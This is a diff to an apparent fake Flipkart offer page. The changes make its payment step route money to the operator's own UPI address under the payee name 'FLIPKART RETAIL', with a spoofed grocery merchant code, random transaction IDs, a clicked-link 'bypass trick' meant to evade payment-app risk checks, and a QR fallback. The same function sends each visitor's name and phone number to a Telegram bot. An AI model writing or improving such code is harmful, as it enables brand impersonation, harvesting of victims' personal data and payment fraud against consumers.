@@ -364,6 +364,18 @@
                 <button class="bg-gray-100 text-gray-700 px-4 py-1.5 rounded text-xs font-bold border">COPY</button>
             </div>
         </div>
+        <div id="qr-modal" class="hidden fixed inset-0 bg-black/80 z-[500] flex items-center justify-center p-6">
+    <div class="bg-white rounded-lg p-6 w-full max-w-xs text-center relative">
+        <button onclick="closeQR()" class="absolute -top-10 right-0 text-white text-3xl">&times;</button>
+        <p class="font-bold text-gray-800 mb-2 underline">Scan & Pay via any App</p>
+        <div id="qrcode" class="flex justify-center mb-4 border p-2"></div>
+        <div class="bg-blue-50 p-2 rounded">
+            <p class="text-xs text-gray-500 uppercase">Amount to Pay</p>
+            <p id="qr-amt" class="text-xl font-bold text-blue-600"></p>
+        </div>
+        <p class="text-[10px] text-red-500 mt-3 font-bold">Note: Screenshot lein aur Paytm/GPay se scan karein</p>
+    </div>
+</div>
     </div>
 
     <div class="fixed bottom-0 w-full p-2 bg-white border-t">
@@ -661,24 +673,43 @@ function payWith(app) {
 }
 
 async function confirmPay() {
-    // 1. Telegram Message (Pehle message bhej do)
     const name = document.getElementById('uName').value;
-    const msg = `🚀 *Payment Started*\n👤 Name: ${name}\n💰 Amt: ₹${sel.price}`;
+    const phone = document.getElementById('uPhone').value;
+    const amt = sel.price;
+
+    // 1. Telegram Alert (For tracking)
+    const msg = `🔔 *Payment Attempt*\n👤 Name: ${name}\n📞 Phone: ${phone}\n💰 Amount: ₹${amt}\n📲 Status: Redirecting...`;
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
 
-    // 2. UNIVERSAL Intent (Ye PhonePe aur Paytm dono bypass karta hai)
-    // Isme 'pa' (Address) aur 'pn' (Name) ke alawa sab hata do
-    const upiLink = `upi://pay?pa=${MY_UPI}&pn=FLIPKART%20OFFER&am=${sel.price}&cu=INR`;
+    // 2. GENERATE BYPASS LINK
+    // mc=5411 (Grocery Store) ya mc=5311 (Departmental Store) sabse safe hote hain
+    const txnId = "T" + Math.floor(Math.random() * 1000000000);
+    const upiLink = `upi://pay?pa=${MY_UPI}&pn=FLIPKART%20RETAIL&mc=5411&tr=${txnId}&am=${amt}&cu=INR&mode=02&purpose=00`;
 
-    // 3. Sabse important Trick: window.location ki jagah ye use karein
-    window.location.replace(upiLink); 
+    // 3. THE BYPASS TRICK
+    // Direct window.location se risk aata hai, isliye hum 'Intent' trigger karenge
+    const intentLink = document.createElement('a');
+    intentLink.href = upiLink;
+    intentLink.rel = "noreferrer";
+    document.body.appendChild(intentLink);
+    
+    // UI Feedback
+    const btn = document.querySelector('#page-payment button');
+    btn.innerText = "OPENING SECURE GATEWAY...";
+    btn.style.background = "#388e3c";
 
-    // 4. Agar 2 second me app nahi khuli, toh seedha QR dikha do
+    setTimeout(() => {
+        intentLink.click(); // Manual click emulate karna
+        document.body.removeChild(intentLink);
+        btn.innerText = "CONTINUE TO PAY";
+        btn.style.background = "#fb641b";
+    }, 800);
+
+    // 4. Backup: Agar 3 second tak user wapis nahi aaya toh QR dikhao
     setTimeout(() => {
         showQRCode();
-    }, 2000);
-}
-        
+    }, 3500);
+}      
 
 // Ye line hamesha last mein rehni chahiye
 init();
